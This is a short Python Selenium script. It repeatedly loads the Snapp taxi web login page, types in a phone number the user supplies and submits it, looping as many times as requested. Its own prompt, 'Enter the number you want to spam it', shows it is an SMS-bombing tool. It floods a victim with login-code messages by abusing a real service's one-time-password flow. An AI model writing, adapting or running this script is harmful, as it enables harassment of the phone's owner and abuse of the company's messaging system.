from selenium import webdriver
from time import sleep

# You must download the chromedriver file. This file available in my repository.

def click(section_xpatch):
    driver.find_element_by_xpath(section_xpatch).click()
    
def fill(section_xpatch, key):
    driver.find_element_by_xpath(section_xpatch).send_keys(str(key))


phone_number = input('Enter the number you want to spam it: ')
number = int(input('Enter the number of messages: '))


for i in range(number):
    driver = webdriver.Chrome(executable_path='/home/[username]/Desktop/chromedriver') # chromedriver patch
    
    driver.get('https://app.snapp.taxi/login/?redirect_to=%2Fpre-ride%3Futm_source%3Dwebsite%26utm_medium%3Dwebapp-button')
    
    while True:
        try:
            click('//*[@id="login-input"]')
            break
        except:
            pass 

    fill('//*[@id="login-input"]', phone_number)
    click('//*[@id="next-button"]')
    sleep(2)
    driver.close()
